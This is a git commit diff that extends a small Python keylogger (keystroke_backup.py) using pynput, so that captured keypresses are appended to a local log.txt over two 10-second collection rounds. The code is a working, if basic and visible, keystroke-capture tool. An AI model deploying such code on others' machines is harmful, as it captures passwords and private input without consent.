f7dfb3b24ec5183d902290fdaaed2de51940d2fa
Josh Hager <jhager603@gmail.com>
2022-12-05 18:49:21 -0500

    implemented a write to a .txt file to store keypresses

--- keystroke_backup.py
+++ keystroke_backup.py
@@ -3,10 +3,14 @@ from pynput import keyboard
 
 keylog = []
 
+def log():
+    with open("log.txt", 'a') as log:
+        log.write(''.join(keylog))
+
 def on_press(key):
     try:
         if(key == keyboard.Key.esc):
-            print(str(keylog))
+            print(''.join(keylog))
         print(str(key.char))
         keylog.append(str(key.char))
     except AttributeError:
@@ -17,4 +21,13 @@ listener = keyboard.Listener(on_press=on_press)
 listener.start()
 
 while True:
+    print('collecting for 10 seconds')
     sleep(10)
+    log()
+    keylog = []
+    print('keylog cleared')
+    print('second round of collection')
+    sleep(10)
+    log()
+    break
+    
